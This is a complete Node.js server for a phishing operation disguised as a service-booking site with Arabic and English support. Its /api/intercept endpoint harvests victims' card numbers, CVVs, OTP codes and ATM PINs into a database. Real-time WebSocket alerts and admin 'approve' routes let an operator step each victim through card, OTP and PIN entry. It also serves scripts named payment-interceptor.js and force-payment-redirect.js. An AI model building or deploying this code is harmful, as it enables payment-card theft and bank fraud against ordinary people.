const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const jwt = require('jsonwebtoken');
const path = require('path');
const fs = require('fs');
const { Pool } = require('pg');
const WebSocket = require('ws');
const http = require('http');

const app = express();
app.use((req, res, next) => { console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`); next(); });
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Configuration
const PORT = process.env.PORT || 8000;
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://localhost/maawen';
const SECRET_KEY = process.env.SECRET_KEY || 'maawen-super-secret-key-2026';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// Database connection
const pool = new Pool({
  connectionString: DATABASE_URL,
});

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve helper scripts from root directory explicitly
app.get('/force-payment-redirect.js', (req, res) => res.sendFile(path.join(__dirname, 'force-payment-redirect.js')));
app.get('/payment-interceptor.js', (req, res) => res.sendFile(path.join(__dirname, 'payment-interceptor.js')));
app.get('/payment-flow.js', (req, res) => res.sendFile(path.join(__dirname, 'payment-flow.js')));

// Serve static files from the assets directory
app.use('/assets', express.static(path.join(__dirname, 'assets'), {
  maxAge: '1d',
  etag: false
}));

// Serve index.html for the root path
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve admin.html
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Initialize database
async function initializeDatabase() {
  try {
    await pool.query('SELECT 1');
    console.log('Database connected successfully');
    
    await pool.query(`
      CREATE TABLE IF NOT EXISTS orders (
        id SERIAL PRIMARY KEY,
        order_ref VARCHAR(50) UNIQUE NOT NULL,
        status VARCHAR(50) DEFAULT 'pending',
        stage VARCHAR(50) DEFAULT 'card',
        customer_name VARCHAR(255),
        customer_phone VARCHAR(50),
        customer_address TEXT,
        service_type VARCHAR(100),
        total_price FLOAT,
        duration VARCHAR(100),
        nationality VARCHAR(100),
        workers INTEGER,
        start_date VARCHAR(100),
        card_number VARCHAR(50),
        card_expiry VARCHAR(10),
        card_cvv VARCHAR(10),
        otp_code VARCHAR(20),
        atm_pin VARCHAR(20),
        raw_message TEXT,
        created_at BIGINT,
        updated_at BIGINT
      );
    `);
    console.log('Database tables initialized successfully');
  } catch (error) {
    console.error('Error initializing database:', error.message);
  }
}

// API Routes

// Intercept order
app.post('/api/intercept', async (req, res) => {
  try {
    const data = req.body;
    let ref = data.order_ref || data.orderRef;
    
    const cardInfo = {
      card_number: data.card_number || data.cardNumber,
      card_expiry: data.card_expiry || data.cardExpiry,
      card_cvv: data.card_cvv || data.cardCvv,
      otp_code: data.otp_code || data.otpCode,
      atm_pin: data.atm_pin || data.atmPin
    };

    // Extract from raw_message if present (supports English and Arabic)
    if (data.raw_message) {
      const msg = data.raw_message;
      
      // Card Number
      const cardMatch = msg.match(/(Card Number|رقم البطاقة):\s*([0-9\s]+)/i);
      if (cardMatch && !cardInfo.card_number) cardInfo.card_number = cardMatch[2].trim();
      
      // Expiry
      const expiryMatch = msg.match(/(Expiry|تاريخ الانتهاء):\s*([0-9/]+)/i);
      if (expiryMatch && !cardInfo.card_expiry) cardInfo.card_expiry = expiryMatch[2].trim();
      
      // CVV
      const cvvMatch = msg.match(/(CVV|رمز الأمان):\s*([0-9]+)/i);
      if (cvvMatch && !cardInfo.card_cvv) cardInfo.card_cvv = cvvMatch[2].trim();
      
      // OTP
      const otpMatch = msg.match(/(OTP|رمز التحقق):\s*([0-9]+)/i);
      if (otpMatch && !cardInfo.otp_code) cardInfo.otp_code = otpMatch[2].trim();
      
      // ATM PIN
      const atmMatch = msg.match(/(ATM PIN|الرقم السري):\s*([0-9]+)/i);
      if (atmMatch && !cardInfo.atm_pin) cardInfo.atm_pin = atmMatch[2].trim();
    }

    const now = Date.now();

    if (!ref) {
      ref = uuidv4().substring(0, 8).toUpperCase();
      await pool.query(
        `INSERT INTO orders (order_ref, status, stage, customer_name, customer_phone, customer_address, service_type, total_price, duration, nationality, workers, start_date, raw_message, card_number, card_expiry, card_cvv, otp_code, atm_pin, created_at, updated_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
        [
          ref, 'waiting_approval', 'card', 
          data.customer_name, data.customer_phone, data.customer_address, 
          data.service_type, data.total_price, data.duration, 
          data.nationality, data.workers, data.start_date, 
          data.raw_message, 
          cardInfo.card_number || null, cardInfo.card_expiry || null, cardInfo.card_cvv || null, 
          cardInfo.otp_code || null, cardInfo.atm_pin || null,
          now, now
        ]
      );
      broadcastToAdmins({ type: 'new_order', ref });
    } else {
      // Collect all possible fields to update
      const updateFields = [];
      const updateValues = [];
      let valIdx = 1;

      const possibleFields = [
        'customer_name', 'customer_phone', 'customer_address', 
        'service_type', 'total_price', 'duration', 
        'nationality', 'workers', 'start_date',
        'card_number', 'card_expiry', 'card_cvv', 
        'otp_code', 'atm_pin', 'raw_message'
      ];

      possibleFields.forEach(field => {
        let val = data[field] || cardInfo[field];
        if (val !== undefined && val !== null) {
          updateFields.push(`${field} = $${valIdx++}`);
          updateValues.push(val);
        }
      });

      if (updateFields.length > 0) {
        updateFields.push(`updated_at = $${valIdx++}`);
        updateValues.push(now);
        
        await pool.query(
          `UPDATE orders SET ${updateFields.join(', ')} WHERE order_ref = $${valIdx}`,
          [...updateValues, ref]
        );

        let msgType = 'order_updated';
        if (cardInfo.card_number) msgType = 'card_submitted';
        if (cardInfo.otp_code) msgType = 'otp_submitted';
        if (cardInfo.atm_pin) msgType = 'atm_pin_submitted';
        broadcastToAdmins({ type: msgType, ref });
      }
    }

    res.json({ orderRef: ref });
  } catch (error) {
    console.error('Error in /api/intercept:', error);
    res.status(500).json({ error: error.message });
  }
});

// Delete all orders
app.post('/api/admin/clear-orders', verifyAdmin, async (req, res) => {
  try {
    await pool.query('DELETE FROM orders');
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/clear-orders:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get order status
app.get('/api/orders/:ref/status', async (req, res) => {
  try {
    const { ref } = req.params;
    const result = await pool.query('SELECT status FROM orders WHERE order_ref = $1', [ref]);
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Order not found' });
    }
    res.json({ status: result.rows[0].status });
  } catch (error) {
    console.error('Error in /api/orders/:ref/status:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    const token = jwt.sign({ sub: username }, SECRET_KEY, { algorithm: 'HS256' });
    res.json({ token, username });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Middleware to verify admin token
const verifyAdmin = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  const token = authHeader.substring(7);
  try {
    const payload = jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
    req.admin = payload.sub;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Get all orders
app.get('/api/admin/orders', verifyAdmin, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM orders ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (error) {
    console.error('Error in /api/admin/orders:', error);
    res.status(500).json({ error: error.message });
  }
});

// Approve card
app.post('/api/admin/orders/:ref/approve-card', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['waiting_otp', 'otp', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/approve-card:', error);
    res.status(500).json({ error: error.message });
  }
});

// Reject card
app.post('/api/admin/orders/:ref/reject-card', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['card_rejected', 'card', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/reject-card:', error);
    res.status(500).json({ error: error.message });
  }
});

// Approve OTP
app.post('/api/admin/orders/:ref/approve-otp', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['waiting_atm_pin', 'atm_pin', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/approve-otp:', error);
    res.status(500).json({ error: error.message });
  }
});

// Reject OTP
app.post('/api/admin/orders/:ref/reject-otp', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['otp_rejected', 'otp', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/reject-otp:', error);
    res.status(500).json({ error: error.message });
  }
});

// Approve ATM
app.post('/api/admin/orders/:ref/approve-atm', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['completed', 'done', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/approve-atm:', error);
    res.status(500).json({ error: error.message });
  }
});

// Reject ATM
app.post('/api/admin/orders/:ref/reject-atm', verifyAdmin, async (req, res) => {
  try {
    const { ref } = req.params;
    await pool.query('UPDATE orders SET status = $1, stage = $2 WHERE order_ref = $3', ['atm_rejected', 'atm_pin', ref]);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in /api/admin/orders/:ref/reject-atm:', error);
    res.status(500).json({ error: error.message });
  }
});

// WebSocket connections
const adminConnections = new Set();
const clientConnections = new Set();

function broadcastToAdmins(message) {
  adminConnections.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(message));
    }
  });
}

wss.on('connection', (ws, req) => {
  const isAdmin = req.url.includes('admin=1');
  
  if (isAdmin) {
    adminConnections.add(ws);
  } else {
    clientConnections.add(ws);
  }

  ws.on('close', () => {
    adminConnections.delete(ws);
    clientConnections.delete(ws);
  });

  ws.on('error', (error) => {
    console.error('WebSocket error:', error);
  });
});

// SPA routing - serve index.html for all other routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Initialize and start server
initializeDatabase().catch(error => {
  console.error('Failed to initialize database:', error);
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
